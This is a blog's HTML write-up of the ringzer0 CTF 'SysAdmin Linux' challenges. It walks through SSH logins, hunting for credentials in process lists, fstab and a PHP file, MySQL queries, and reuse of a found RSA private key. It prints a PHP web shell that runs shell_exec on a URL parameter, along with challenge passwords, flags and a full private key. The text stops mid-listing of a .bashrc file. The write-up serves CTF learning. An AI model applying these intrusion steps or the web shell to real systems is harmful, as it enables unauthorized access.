@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="keywords" content="ringzer0, ctf, wargames, admin, linux">
+        <meta name="description" content="SysAdmin Part 1 Let's login to the machine: $ sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13375 _ ____ __ _____(_)___ ____ _____ ___ _____/ __ \/ /____ ____ _____ ___ / ___/ / __ \/ __ `/_ / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \ / / / / / / / /_/ / / /_/ __/ / / /_/ / /_ ...">
+        <title>ringzer0 CTF - SysAdmin Linux - blog.dornea.nu</title>
+        <link rel="shortcut icon" type="image/x-icon" href="/favicon.png">
+        <link rel="stylesheet" href="/css/ipython.min.css" type="text/css" />
+        <link rel="stylesheet" href="http://blog.dornea.nu/theme/css/bootstrap.min.css" type="text/css" />
+        <link rel="stylesheet" href="http://blog.dornea.nu/theme/font-icons/style.min.css" type="text/css" />
+        <link rel="stylesheet" href="http://blog.dornea.nu/theme/css/niu2.min.css" type="text/css" />
+        <link rel="stylesheet" href="/css/custom.css" type="text/css" />
+		
+        <script type="text/javascript" src="http://blog.dornea.nu/theme/js/jquery-1.11.0.min.js"></script>
+        <script type="text/javascript" src="http://blog.dornea.nu/theme/js/niu2.min.js"></script>
+        <script type="text/javascript" src="http://blog.dornea.nu/theme/js/bootstrap.min.js"></script>
+        
+        <link rel="canonical" href="http://blog.dornea.nu/2016/10/30/ringzer0-ctf-sysadmin-linux" />
+        <script type="text/javascript">window.onload=function(){};</script>
+        <!--[if lt IE 9]>
+            <script src="http://blog.dornea.nu/theme/js/html5shiv.js"></script>
+            <script src="http://blog.dornea.nu/theme/js/respond.min.js"></script>
+        <![endif]-->
+    </head>
+    <body> 
+        <div id="body-header">
+            <div class="navbar navbar-inverse navbar-fixed-top">
+                <div class="col-md-12">
+                    <div class="navbar-header">
+                        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </button>
+                        <a class="navbar-brand" href="http://blog.dornea.nu">
+                            <i class="icon-home"></i>blog.dornea.nu
+                        </a>
+                    </div>
+                    <nav class="collapse navbar-collapse bs-navbar-collapse" role="navigation">
+                        <ul class="nav navbar-nav">
+                            <li><a href="http://dornea.nu" title="about">
+                                <i class="icon-user"></i>about</a>
+                            </li>
+                            <li><a href="/archives.html" title="archives">
+                                <i class="icon-archive"></i>archives</a>
+                            </li>
+                            <li><a href="/tags.html" title="tags">
+                                <i class="icon-tag"></i>tags</a>
+                            </li>
+                            <li><a href="/feeds/rss.xml" title="feeds">
+                                <i class="icon-rss"></i>feeds</a>
+                            </li>
+                        <!-- category dropdown list -->
+                        <li class="dropdown">
+                           <a href="#" class="dropdown-toggle" data-toggle="dropdown">
+                                <i class="icon-folder-open"></i>category<b class="caret"></b>
+                           </a>
+                           <ul class="dropdown-menu">
+                               <li><a href="http://blog.dornea.nu/category/blog">
+                                      <i class="icon-pencil"></i>blog
+                                      (114)</a></li>
+                               <li><a href="http://blog.dornea.nu/category/low">
+                                   <i class="icon-folder-close"></i>LOW
+                                      (27)</a></li>
+                               <li><a href="http://blog.dornea.nu/category/notes">
+                                      <i class="icon-book"></i>notes
+                                      (21)</a></li>
+                           </ul>
+                        </li>
+                        <!--  self defined dropdown list -->
+                        </ul>
+                        
+                        <!-- right nav bar -->
+                        <ul class="nav navbar-nav navbar-right">
+                        <!-- google custom search -->
+                        <li>
+                        <div id="niu2-cse-wrapper">
+                            <div id="niu2-cse-header-box" class="navbar-form navbar-nav">
+                                <form action="http://google.com/cse">
+                                    <input type="hidden" name="cx" value="008508447409818574933:pxyxuhrgnxi" />
+                                    <input type="hidden" name="ie" value="UTF-8" />
+                                    <div class="form-group">
+                                        <input id="niu2-cse-search-input" class="niu2-cse-header form-control" 
+                                            type="text" name="q" 
+                                            placeholder="Press enter to search ..."/>
+                                    </div>
+                                </form>
+                           </div>
+                           <div id="niu2-cse-ctrl-box" class="navbar-nav">
+                            <i id="niu2-cse-search-image" class="icon-search navbar-nav"></i><span id="niu2-cse-search-text">Search</span>
+                           </div>
+                       </div>
+                       </li>
+                       </ul>
+                    </nav>
+                </div>
+            </div>
+<style>
+    #banner{
+        background-image:url("http://blog.dornea.nu//images/header.jpg");
+    }   
+</style>
+
+<div id="banner">
+    <div class="container">
+        <div class="copy">
+            <h2>blog.dornea.nu</h2>
+                <p class="intro">Hack, code and drink some țuică. Personal blog of Victor Dorneanu.</p>
+        </div>
+    </div>
+</div>
+            <!-- End Banner -->
+        </div>
+
+        <div id="body-content">
+            <div class="col-md-8 col-md-offset-2">
+                <h1 id="content-heading">ringzer0 CTF - SysAdmin Linux</h1>
+            </div>
+            <div id="niu2-left-container" class="col-md-6 col-md-offset-2 with-right-border">
+                <div id="niu2-main-content">
+                    <h2 id="4a7b6e245caad2efaf1cb51284039140">SysAdmin Part 1</h2>
+<p>Let's login to the machine:</p>
+<div class="highlight"><pre><span class="nv">$ </span>sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13375
+
+         _                             ____  __                     
+   _____<span class="o">(</span>_<span class="o">)</span>___  ____ _____  ___  _____/ __ <span class="se">\/</span> /____  ____ _____ ___ 
+  / ___/ / __ <span class="se">\/</span> __ <span class="sb">`</span>/_  / / _ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\/</span> __ <span class="sb">`</span>/ __ <span class="sb">`</span>__ <span class="se">\</span>
+ / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
+/_/  /_/_/ /_/<span class="se">\_</span>_, / /___/<span class="se">\_</span>__/_/   <span class="se">\_</span>___/<span class="se">\_</span>_/<span class="se">\_</span>__/<span class="se">\_</span>_,_/_/ /_/ /_/ 
+             /____/                                                 
+                                      _ _             ___ _____ ___ 
+                             ___ _ _ <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span>_ _  ___   / __<span class="p">|</span>_   _<span class="p">|</span> __<span class="p">|</span>
+                            / _ <span class="se">\ </span><span class="s1">' \| | | '</span> <span class="se">\/</span> -_<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__  <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> _<span class="p">|</span> 
+                            <span class="se">\_</span>__/_<span class="o">||</span>_<span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span>_<span class="o">||</span>_<span class="se">\_</span>__<span class="p">|</span>  <span class="se">\_</span>__<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>  
+
+
+You have mail.
+morpheus@forensics:~<span class="nv">$ </span>
+</pre></div>
+<p>What's in $HOME:</p>
+<div class="highlight"><pre>morpheus@forensics:~<span class="nv">$ </span>ls  -l
+total 4
+-rw-r----- <span class="m">1</span> root root <span class="m">1655</span> Mar <span class="m">10</span>  <span class="m">2014</span> egrep
+morpheus@forensics:~<span class="nv">$ </span>ls -la
+total 28
+drwxr-xr-x  <span class="m">2</span> morpheus morpheus <span class="m">4096</span> Mar <span class="m">10</span>  <span class="m">2014</span> .
+drwxr-xr-x <span class="m">10</span> root     root     <span class="m">4096</span> Jun <span class="m">12</span>  <span class="m">2014</span> ..
+lrwxrwxrwx  <span class="m">1</span> root     root        <span class="m">9</span> Mar  <span class="m">9</span>  <span class="m">2014</span> .bash_history -&gt; /dev/null
+-rw-r-----  <span class="m">1</span> morpheus morpheus  <span class="m">220</span> Mar  <span class="m">9</span>  <span class="m">2014</span> .bash_logout
+-rwxrwxr-x  <span class="m">1</span> morpheus morpheus   <span class="m">36</span> Feb <span class="m">24</span> 11:16 .bashrc
+-rw-r-----  <span class="m">1</span> root     root     <span class="m">1655</span> Mar <span class="m">10</span>  <span class="m">2014</span> egrep
+-rw-r-----  <span class="m">1</span> morpheus morpheus  <span class="m">675</span> Mar  <span class="m">9</span>  <span class="m">2014</span> .profile
+-rw-r-----  <span class="m">1</span> morpheus morpheus   <span class="m">19</span> Mar  <span class="m">9</span>  <span class="m">2014</span> .vimrc
+</pre></div>
+<p>Nothing interesting. What about running processes?</p>
+<div class="highlight"><pre>morpheus@forensics:~<span class="nv">$ </span>ps -ax
+ <span class="m">2615</span> ?        S      0:00 logger -t mysqld -p daemon.error
+ <span class="m">2695</span> ?        Ss     0:12 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 105:108
+ <span class="m">3110</span> ?        Ssl    0:00 /usr/sbin/slapd -h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d
+ <span class="m">3159</span> ?        Ss     0:00 /usr/sbin/cron
+ <span class="m">3191</span> ?        Ss     0:05 /usr/sbin/sshd
+ <span class="m">3238</span> ?        Ss     0:12 /usr/sbin/vnstatd -d
+ <span class="m">3262</span> ?        Ss     0:00 /usr/sbin/exim4 -bd -q30m
+ <span class="m">3286</span> ?        S      0:04 /bin/sh /root/backup.sh -u trinity -p Flag-08grILsn3ekqhDK7cKBV6ka8B
+ <span class="m">3289</span> ?        S      0:00 su neo -c /bin/monitor
+ <span class="m">3292</span> ?        Ss     0:00 /bin/monitor
+ <span class="m">3319</span> tty1     Ss+    0:00 /sbin/getty <span class="m">38400</span> tty1
+ <span class="m">3320</span> tty2     Ss+    0:00 /sbin/getty <span class="m">38400</span> tty2
+ <span class="m">3321</span> tty3     Ss+    0:00 /sbin/getty <span class="m">38400</span> tty3
+ <span class="m">3322</span> tty4     Ss+    0:00 /sbin/getty <span class="m">38400</span> tty4
+ <span class="m">3323</span> tty5     Ss+    0:00 /sbin/getty <span class="m">38400</span> tty5
+ <span class="m">3324</span> tty6     Ss+    0:00 /sbin/getty <span class="m">38400</span> tty6
+ <span class="m">3651</span> ?        S      0:04 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 105:108
+ <span class="m">9100</span> ?        S      0:01 <span class="o">[</span>kworker/0:2<span class="o">]</span>
+<span class="m">16157</span> ?        S      0:00 su neo -c /bin/monitor
+<span class="m">16159</span> ?        Ss     0:00 /bin/monitor
+<span class="m">19107</span> ?        S      0:00 <span class="o">[</span>kworker/0:0<span class="o">]</span>
+</pre></div>
+<p>Ah, there we go.</p>
+<h2 id="50382a1e045d7b8d428b259fd7444848">SysAdmin Part 2</h2>
+<p>Now let's login with <code>trinity</code>:</p>
+<div class="highlight"><pre><span class="nv">$ </span>sshpass -p Flag-08grILsn3ekqhDK7cKBV6ka8B ssh trinity@for01.ringzer0team.com -p 13375
+
+         _                             ____  __                     
+   _____<span class="o">(</span>_<span class="o">)</span>___  ____ _____  ___  _____/ __ <span class="se">\/</span> /____  ____ _____ ___ 
+  / ___/ / __ <span class="se">\/</span> __ <span class="sb">`</span>/_  / / _ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\/</span> __ <span class="sb">`</span>/ __ <span class="sb">`</span>__ <span class="se">\</span>
+ / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
+/_/  /_/_/ /_/<span class="se">\_</span>_, / /___/<span class="se">\_</span>__/_/   <span class="se">\_</span>___/<span class="se">\_</span>_/<span class="se">\_</span>__/<span class="se">\_</span>_,_/_/ /_/ /_/ 
+             /____/                                                 
+                                      _ _             ___ _____ ___ 
+                             ___ _ _ <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span>_ _  ___   / __<span class="p">|</span>_   _<span class="p">|</span> __<span class="p">|</span>
+                            / _ <span class="se">\ </span><span class="s1">' \| | | '</span> <span class="se">\/</span> -_<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__  <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> _<span class="p">|</span> 
+                            <span class="se">\_</span>__/_<span class="o">||</span>_<span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span>_<span class="o">||</span>_<span class="se">\_</span>__<span class="p">|</span>  <span class="se">\_</span>__<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>  
+
+
+You have mail.
+</pre></div>
+<p>Now let's have a look inside <code>/etc</code> for files containing <strong>architect</strong>:</p>
+<div class="highlight"><pre>trinity@forensics:/etc<span class="nv">$ </span>grep -r <span class="s2">"architect"</span> 2&gt;/dev/null <span class="p">|</span> head -n 10
+fstab:#//TheMAtrix/phone  /media/Matrix  cifs  <span class="nv">username</span><span class="o">=</span>architect,password<span class="o">=</span><span class="k">$(</span>base64 -d <span class="s2">"RkxBRy14QXFXMnlKZzd4UERCV3VlVGdqd05jMW5WWQo="</span><span class="k">)</span>,iocharset<span class="o">=</span>utf8,sec<span class="o">=</span>ntlm  <span class="m">0</span>  0
+init.d/checkroot.sh:            <span class="c"># fail on older kernels on sparc64/alpha architectures due</span>
+aide/aide.conf.d/10_aide_hostname:if <span class="o">[</span> -n <span class="s2">"</span><span class="k">$(</span>dpkg --print-architecture<span class="k">)</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+aide/aide.conf.d/10_aide_hostname:  <span class="nb">echo</span> <span class="s2">"@@define ARCH </span><span class="k">$(</span>dpkg --print-architecture<span class="k">)</span><span class="s2">"</span>
+group:architect:x:1006:
+passwd:architect:x:1006:1006::/home/architect:/bin/bash
+^C
+trinity@forensics:/etc<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"RkxBRy14QXFXMnlKZzd4UERCV3VlVGdqd05jMW5WWQo="</span> <span class="p">|</span> base64 -d
+FLAG-xAqW2yJg7xPDBWueTgjwNc1nVY
+</pre></div>
+<p>Ok, next level.</p>
+<h2 id="2c1ffccb306055f3642a61185921af5a">SysAdmin Part 3</h2>
+<p>Let's search for <strong>readable</strong> files and <strong>owned</strong> by the user <strong>architect</strong>:</p>
+<div class="highlight"><pre><span class="nv">$ </span>architect@forensics:/<span class="nv">$ </span>find . -readable -and -user architect 2&gt;/dev/null <span class="p">|</span> head -n 10
+./var/mail/architect
+./var/www/index.php
+./dev/pts/1
+./dev/pts/0
+./proc/11081
+./proc/11081/task
+./proc/11081/task/11081
+./proc/11081/task/11081/attr
+...
+</pre></div>
+<p>Hmm, <code>/var/www/index.php</code> looks interesting:</p>
+<div class="highlight"><pre><span class="x">architect@forensics:/$ cat /var/www/index.php  | head -n 20</span>
+<span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="nv">$res</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]));</span>
+  <span class="nb">print_r</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s1">'&lt;br /&gt;'</span><span class="p">,</span> <span class="nv">$res</span><span class="p">));</span>
+  <span class="k">exit</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="nv">$info</span> <span class="o">=</span> <span class="p">(</span><span class="nx">object</span><span class="p">)</span><span class="k">array</span><span class="p">();</span>
+<span class="nv">$info</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="s2">"arch"</span><span class="p">;</span>
+<span class="nv">$info</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="s2">"asdftgTst5sdf6309sdsdff9lsdftz"</span><span class="p">;</span>
+<span class="nv">$id</span> <span class="o">=</span> <span class="mi">1003</span><span class="p">;</span>
+
+<span class="k">function</span> <span class="nf">GetList</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span> <span class="nv">$info</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+        <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s2">"127.0.0.1"</span><span class="p">,</span> <span class="nv">$info</span><span class="o">-&gt;</span><span class="na">username</span><span class="p">,</span> <span class="nv">$info</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">);</span>
+        <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s2">"arch"</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
+        <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"SELECT * FROM arch"</span><span class="p">);</span>
+        <span class="nv">$output</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+        <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nb">array_push</span><span class="p">(</span><span class="nv">$output</span><span class="p">,</span> <span class="nv">$row</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="o">...</span>
+</pre></div>
+<p>Ah, some credentials for a <strong>MySQL</strong> DB. Let's have a look:</p>
+<div class="highlight"><pre>architect@forensics:~<span class="nv">$ </span>mysql -h localhost -u arch -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
+Your MySQL connection id is 66
+Server version: 5.5.49-0+deb7u1 <span class="o">(</span>Debian<span class="o">)</span>
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2016, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for</span> help. Type <span class="s1">'\c'</span> to clear the current input statement.
+
+mysql&gt; show databases<span class="p">;</span>
++--------------------+
+<span class="p">|</span> Database           <span class="p">|</span>
++--------------------+
+<span class="p">|</span> information_schema <span class="p">|</span>
+<span class="p">|</span> arch               <span class="p">|</span>
++--------------------+
+<span class="m">2</span> rows in <span class="nb">set</span> <span class="o">(</span>0.04 sec<span class="o">)</span>
+
+mysql&gt; use arch<span class="p">;</span>
+Reading table information <span class="k">for</span> completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables<span class="p">;</span>
++----------------+
+<span class="p">|</span> Tables_in_arch <span class="p">|</span>
++----------------+
+<span class="p">|</span> arch           <span class="p">|</span>
+<span class="p">|</span> flag           <span class="p">|</span>
++----------------+
+<span class="m">2</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+
+mysql&gt; <span class="k">select</span> * from flag<span class="p">;</span>
++---------------------------------+
+<span class="p">|</span> flag                            <span class="p">|</span>
++---------------------------------+
+<span class="p">|</span> FLAG-0I68UrLA758G5G30806w637a4k <span class="p">|</span>
++---------------------------------+
+<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</pre></div>
+<h2 id="02266b5b34bd7aa2b442ea12fad58a29">SysAdmin Part 4</h2>
+<p>I first had a look about all <strong>readable</strong> files (to user <strong>architect</strong>) and searched for <code>oracle</code> inside them:</p>
+<div class="highlight"><pre>architect@forensics:~<span class="nv">$ </span>find / -readable -exec grep -i <span class="s2">"oracle"</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
+Binary file /backup/c074fa6ec17bb35e168366c43cf4cd19 matches
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoEgxjSM+zh29CqzIet5hxwI4gwWsHL56XlN3xM1zylCog02tZJ5/EA17hvQRoBmh+9lsEaseKnIHpf4WC6BdirAHS56bTq5Mach0cBnIdXogT1/+EsKb72dY4l9S880VsxoiLO/MxWE7oZMbLEnzOH8BJBdgEdLPI7GSaoMsHvMW17IkXuG/qzpbbROamOExC04LSZjCfrhkKxWLZ3Vzu0WLDftw661PUt9lpoBQEjB2m8voEWOqk2THPCbXTl4VMO3hZk0o5n2c6ezXwwcEcU5eTxaADELqCq0TaCvtxMFmxvC+Neu17yhO0BYK/dgdIQIf3U3MTcMpWS0LCvVuN oracle@forensics
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoEgxjSM+zh29CqzIet5hxwI4gwWsHL56XlN3xM1zylCog02tZJ5/EA17hvQRoBmh+9lsEaseKnIHpf4WC6BdirAHS56bTq5Mach0cBnIdXogT1/+EsKb72dY4l9S880VsxoiLO/MxWE7oZMbLEnzOH8BJBdgEdLPI7GSaoMsHvMW17IkXuG/qzpbbROamOExC04LSZjCfrhkKxWLZ3Vzu0WLDftw661PUt9lpoBQEjB2m8voEWOqk2THPCbXTl4VMO3hZk0o5n2c6ezXwwcEcU5eTxaADELqCq0TaCvtxMFmxvC+Neu17yhO0BYK/dgdIQIf3U3MTcMpWS0LCvVuN oracle@forensics
+Binary file /var/cache/apt-show-versions/apackages matches
+Binary file /var/cache/man/index.db matches
+...
+</pre></div>
+<p>Inside <code>/backup/c074fa6ec17bb35e168366c43cf4cd19</code> we can then find: </p>
+<div class="highlight"><pre><span class="o">[</span>...<span class="o">]</span>
+----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAqBIMY0jPs4dvQqsyHreYccCOIMFrBy+el5Td8TNc8pQqINNr
+WSefxANe4b0EaAZofvZbBGrHipyB6X+FgugXYqwB0uem06uTGnIdHAZyHV6IE9f/
+hLCm+9nWOJfUvPNFbMaIizvzMVhO6GTGyxJ8zh/ASQXYBHSzyOxkmqDLB7zFteyJ
+F7hv6s6W20TmpjhMQtOC0mYwn64ZCsVi2d1c7tFiw37cOutT1LfZaaAUBIwdpvL6
+BFjqpNkxzwm105eFTDt4WZNKOZ9nOns18MHBHFOXk8WgAxC6gqtE2gr7cTBZsbwv
+jXrte8oTtAWCv3YHSECH91NzE3DKVktCwr1bjQIDAQABAoIBAQCdefu9c1WZY4bu
+MrYNbf0aaE9Dhbcgzo+Me+HQxE2MxSMMCsyEhsn9wSK/5Hkidw6mF3KEmwBIcgiP
+nfqdA5YV0BENahw4LITyvIVl4uw9dHuQDEzQKSzswdkkwa6FNHOSThtWSl+9ln6o
+5PQXBkWGZN2oDh+vXSGvWz+QWqSho8vufmTtYntfFPAfVfcyp8BtiUgKQh069uGg
+XKnehmkrHoW9gQ2Lo0uaFWcTIGm1vsgBd7L4cfb98jDB63H+Lhf4UPYv4WmH2rrj
+bnk5lAU71JK4QsPnnOx1PA685p2e5mEfh0LKRKq9Fx3+umbGPJGvgcjobtXaW9OT
+mpaz6ZPBAoGBAM+diN8s/osQdi8odS9+HUWVZBa9Z2Dn0X2IlSxWK9u/UclhjYgP
+i2KXEY0wRV+ZiXURmrFNVxgA/EJ9BOgptSZNmi9fEdfnVB4L11T7HFny/J8u3sXt
+dn0OqHmf5ZEPtV7m0bK0jtznTgTTuBI9yXvRgHO2HQPCshdP7GIgt++lAoGBAM89
+Pd7HyMYnh0ancCTICkVIIWF6Ylf20BKz4Zwy9tYASCxY3iFllBdOXw/UgCnmJseQ
+73Dcimi5OEyUckOp7xX4HTwidFVbxfNeC0ZfsPbd22qSDcw5orpQMoDy3iP+bPJh
+SgwtusqotGjm0jTpnhqRV5x6rchzkMYwF8/WkvfJAoGBAMeem6yh0XiaclfzWYE5
+jCGMezjWEeD949IEkhGYJQFbmeK79l49O/KmeAy9veYmdSDntUoGp9f/kozHMgGb
+oH5cnQQxL7HczWc6UWd3LhJabIUNhsreAFBL2Ldgg1UPun6uBjACJV7G06AWhWSc
+ne58SDp5frpP5/Y8NXdAKDq1AoGAYCSFQ4lj96n29CxRtn6nZSTld5eTcEOsnECf
+dhuesAFJemlwBAZgAb/2Eh3/p3CCpSr0KmPmQldLaxujNwjrRkHpLjC9z6vX1ePX
+TzqtmpmqZXKEvC4w9EaoZ3JE5GXwnTHNbID6m3JQ4CnVc36+Po0XHB096jTTAV7m
+bSGa5SECgYBE2IuW1pk2pOZ+FDtKltWHk8KK89QmGsFf2YnVZ/FsAkPnayeTkmMz
+AWxRP/W/Uj5ypw7KjprQee31hkisBG/ZPBvQdjAvxF7m4usuEN2Nkb0FTIjZHYbD
+iPOmPHIUlwwL8UVzDQUzXhegSB4GUeP/06T/eM5PPB8SX0ZaHIw1wQ<span class="o">==</span>
+-----END RSA PRIVATE KEY-----
+<span class="o">[</span>...<span class="o">]</span>
+</pre></div>
+<p>... which is most probably a private ssh key. Next I try to login to the machine using the previously find SSH identity:</p>
+<div class="highlight"><pre>% ssh -i ssh oracle@for01.ringzer0team.com -p 13375
+
+         _                             ____  __                     
+   _____<span class="o">(</span>_<span class="o">)</span>___  ____ _____  ___  _____/ __ <span class="se">\/</span> /____  ____ _____ ___ 
+  / ___/ / __ <span class="se">\/</span> __ <span class="sb">`</span>/_  / / _ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\/</span> __ <span class="sb">`</span>/ __ <span class="sb">`</span>__ <span class="se">\</span>
+ / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
+/_/  /_/_/ /_/<span class="se">\_</span>_, / /___/<span class="se">\_</span>__/_/   <span class="se">\_</span>___/<span class="se">\_</span>_/<span class="se">\_</span>__/<span class="se">\_</span>_,_/_/ /_/ /_/ 
+             /____/                                                 
+                                      _ _             ___ _____ ___ 
+                             ___ _ _ <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span>_ _  ___   / __<span class="p">|</span>_   _<span class="p">|</span> __<span class="p">|</span>
+                            / _ <span class="se">\ </span><span class="s1">' \| | | '</span> <span class="se">\/</span> -_<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__  <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> _<span class="p">|</span> 
+                            <span class="se">\_</span>__/_<span class="o">||</span>_<span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span>_<span class="o">||</span>_<span class="se">\_</span>__<span class="p">|</span>  <span class="se">\_</span>__<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>  
+
+
+You have mail.
+</pre></div>
+<p>Bingo! Now let's look around:</p>
+<div class="highlight"><pre>oracle@forensics:~<span class="nv">$ </span>ls -la
+total 36
+drwxr-x---  <span class="m">3</span> oracle oracle <span class="m">4096</span> Mar <span class="m">12</span>  <span class="m">2014</span> .
+drwxr-xr-x <span class="m">10</span> root   root   <span class="m">4096</span> Jun <span class="m">12</span>  <span class="m">2014</span> ..
+-rw-------  <span class="m">1</span> root   root      <span class="m">0</span> Mar <span class="m">12</span>  <span class="m">2014</span> .bash_history
+-rw-r-----  <span class="m">1</span> oracle oracle  <span class="m">220</span> Dec <span class="m">29</span>  <span class="m">2012</span> .bash_logout
+-rw-r-----  <span class="m">1</span> oracle oracle <span class="m">3512</span> Mar <span class="m">12</span>  <span class="m">2014</span> .bashrc
+-rw-r-----  <span class="m">1</span> oracle oracle   <span class="m">90</span> Mar <span class="m">12</span>  <span class="m">2014</span> encflag.txt.enc
+-rw-r-----  <span class="m">1</span> oracle oracle   <span class="m">45</span> Mar <span class="m">12</span>  <span class="m">2014</span> flag.txt
+-rw-r-----  <span class="m">1</span> oracle oracle  <span class="m">675</span> Dec <span class="m">29</span>  <span class="m">2012</span> .profile
+drwx------  <span class="m">2</span> oracle oracle <span class="m">4096</span> Mar <span class="m">12</span>  <span class="m">2014</span> .ssh
+-rw-r-----  <span class="m">1</span> oracle oracle   <span class="m">19</span> Mar  <span class="m">4</span>  <span class="m">2014</span> .vimrc
+oracle@forensics:~<span class="nv">$ </span>cat flag.txt 
+<span class="nv">RkxBRy1HSUdzMVdxNlY2U3NaOWg0YVFncEdnZGJkUAo</span><span class="o">=</span>
+oracle@forensics:~<span class="nv">$ </span>cat flag.txt <span class="p">|</span> base64 -d
+FLAG-GIGs1Wq6V6SsZ9h4aQgpGgdbdP
+</pre></div>
+<h2 id="46f00bc29c21214db6d5871487d0f227">SysAdmin Part 5</h2>
+<p>SSH into machine:</p>
+<div class="highlight"><pre><span class="nv">$ </span>ssh -i ssh oracle@for01.ringzer0team.com -p 13375
+oracle@forensics:~<span class="nv">$ </span>cat .bashrc 
+<span class="c"># ~/.bashrc: executed by bash(1) for non-login shells.</span>
+<span class="c"># see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)</span>
+<span class="c"># for examples</span>
+
+<span class="c"># If not running interactively, don't do anything</span>
+<span class="k">case</span> <span class="nv">$-</span> in
+    *i*<span class="o">)</span> <span class="p">;;</span>
+      *<span class="o">)</span> <span class="k">return</span><span class="p">;;</span>
+<span class="k">esac</span>
+
+<span class="c"># don't put duplicate lines or lines starting with space in the history.</span>
+<span class="c"># See bash(1) for more options</span>
+<span class="nv">HISTCONTROL</span><span class="o">=</span>ignoreboth
+
+<span class="c"># append to the history file, don't overwrite it</span>
+<span class="nb">shopt</span> -s histappend
+
+<span class="c"># for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</span>
+<span class="nv">HISTSIZE</span><span class="o">=</span>1000
+<span class="nv">HISTFILESIZE</span><span class="o">=</span>2000
+
+<span class="c"># check the window size after each command and, if necessary,</span>
+<span class="c"># update the values of LINES and COLUMNS.</span>
+<span class="nb">shopt</span> -s checkwinsize
+
+<span class="c"># If set, the pattern "**" used in a pathname expansion context will</span>
+<span class="c"># match all files and zero or more directories and subdirectories.</span>
+<span class="c">#shopt -s globstar</span>
+
+<span class="c"># make less more friendly for non-text input files, see lesspipe(1)</span>
